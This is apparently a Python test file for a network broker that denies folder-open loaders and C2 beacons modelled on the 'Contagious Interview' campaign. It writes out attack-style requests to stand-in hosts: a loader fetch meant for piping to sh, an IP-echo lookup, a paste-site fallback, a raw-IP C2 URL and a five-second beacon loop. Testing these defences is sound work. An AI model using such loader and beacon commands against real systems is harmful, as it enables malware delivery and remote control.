"""Folder-open loader and beacon behaviour, shaped after the DPRK "Contagious
Interview" tasks.json campaign (docs/adr/20261104-defeat-folder-open-loaders.md).

All destinations are test-owned stand-ins: `*.hosting.example.test` for the
`*.vercel.app` loader, `ipecho.example.test` for ipify.org, `paste.example.test`
for api.npoint.io, and RFC 5737 `192.0.2.10:1224` for the raw-IP C2. None is
served by any container, and every broker network is --internal."""

import time

LOADER = "https://loader.hosting.example.test/settings/mac?flag=1"
RISKY = [{"host": "*.hosting.example.test", "category": "hosting"},
         {"host": "ipecho.example.test", "category": "ip-echo"},
         {"host": "paste.example.test", "category": "paste"}]


def labelled_proxy_env(pod, label: str) -> dict:
    proxy = f"http://seclab+{label}:{pod.proxy_password}@broker:8080"
    return {k: proxy for k in ("HTTPS_PROXY", "https_proxy", "HTTP_PROXY", "http_proxy")}


def test_contagious_interview_loader_is_denied_without_a_prompt(pod, ctl):
    pod.load({"baseline": True, "allow": [{"id": "api", "host": "api.example.test"}],
              "riskyDestinations": RISKY, "prompt": {"timeoutSeconds": 10}})
    ctl.call("tab.event", {"kind": "opened"})  # folder open, no user action yet
    mark = ctl.mark()
    env = labelled_proxy_env(pod, "task.env")
    # What the folder-open task does: fetch a loader, look up the public IP, reach the
    # paste-site fallback, and talk to the raw-IP C2 over cleartext on port 1224.
    for url in (LOADER, "https://ipecho.example.test/?format=json", "https://paste.example.test/96979650",
                "http://192.0.2.10:1224/client/7/701"):
        r = pod.curl(url, env=env)
        assert r.code == 403, (url, r.code, r.body[:200])
    # The loader pipeline itself: `curl … | sh` receives the broker's 403 body, never a script.
    p = pod.ws(f"curl -s '{LOADER}'", env=env)
    assert b'"error": "seclab-broker"' in p.stdout
    # Legitimate early traffic that a rule allows is unaffected.
    assert pod.curl("https://api.example.test/echo/early", env=env).code == 200
    assert ctl.notes_since(mark, "approval.requested") == []
    denied = [e for e in pod.audit() if e["type"] == "request.denied_unprompted"
              and e["host"] in ("loader.hosting.example.test", "ipecho.example.test",
                                "paste.example.test", "192.0.2.10")]
    assert {e["reason"] for e in denied} == {"risky-before-user-action", "raw-ip-destination"}
    assert all(e["risk"]["origin"] == {"label": "task.env", "verified": False} for e in denied)
    raw = [e for e in denied if e["host"] == "192.0.2.10"][0]
    assert {"raw-ip", "cleartext", "nonstandard-port"} <= set(raw["risk"]["flags"])
    # After the user acts, a risky destination prompts, flagged, without "always allow".
    ctl.call("tab.event", {"kind": "userAction"})
    ctl.handlers["approval.requested"] = lambda p: ctl.call(
        "approval.decide", {"approvalId": p["approvalId"], "decision": "deny"})
    assert pod.curl(LOADER, env=env).code == 403
    prompt = ctl.wait_note("approval.requested", since=mark, timeout=10)
    assert prompt["decisions"][:2] == ["allow-once", "deny"] and "allow-tab" not in prompt["decisions"]
    assert "risky-destination:hosting" in prompt["risk"]["flags"]
    assert prompt["risk"]["origin"]["label"] == "task.env"
    # The raw IP stays denied without a prompt even after user action (default policy).
    assert pod.curl("http://192.0.2.10:1224/client/7/701", env=env).code == 403
    assert len(ctl.notes_since(mark, "approval.requested")) == 1


def test_five_second_beacon_yields_one_prompt(pod, ctl):
    """A C2 beacon every 5 s, as in the campaign. The user denies the first prompt;
    the rest are denied without prompting (per-destination cooldown)."""
    pod.load({"allow": [], "prompt": {"timeoutSeconds": 3}})
    ctl.handlers["approval.requested"] = lambda p: ctl.call(
        "approval.decide", {"approvalId": p["approvalId"], "decision": "deny"})
    mark = ctl.mark()
    p = pod.ws("for i in 1 2 3 4 5; do curl -s -o /dev/null --max-time 10 -w '%{http_code} ' "
               "https://c2.example.test/beacon; sleep 5; done", timeout=90)
    assert p.stdout.decode().split() == ["403"] * 5
    prompts = [n for n in ctl.notes_since(mark, "approval.requested") if n["request"]["host"] == "c2.example.test"]
    assert len(prompts) == 1


def test_deny_new_destinations_after_repeated_denials(pod, ctl):
    """A beacon that rotates destinations to dodge per-destination cooldown: after
    two denials the prompt offers deny-new-destinations, and then nothing new prompts."""
    pod.load({"allow": [], "prompt": {"timeoutSeconds": 5, "offerDenyNewAfter": 2}})

    def decide(p):
        d = "deny-new-destinations" if "deny-new-destinations" in p["decisions"] else "deny"
        ctl.call("approval.decide", {"approvalId": p["approvalId"], "decision": d})

    ctl.handlers["approval.requested"] = decide
    mark = ctl.mark()
    codes = [pod.curl(f"https://d{i}.rotate.example.test/beacon").code for i in range(1, 7)]
    assert codes == [403] * 6
    prompted = [n["request"]["host"] for n in ctl.notes_since(mark, "approval.requested")]
    assert prompted == ["d1.rotate.example.test", "d2.rotate.example.test", "d3.rotate.example.test"]
    assert ctl.call("health")["prompt"]["denyNewDestinations"] is True
    ctl.call("prompt.reset")
    assert ctl.call("health")["prompt"]["denyNewDestinations"] is False
    time.sleep(0.2)
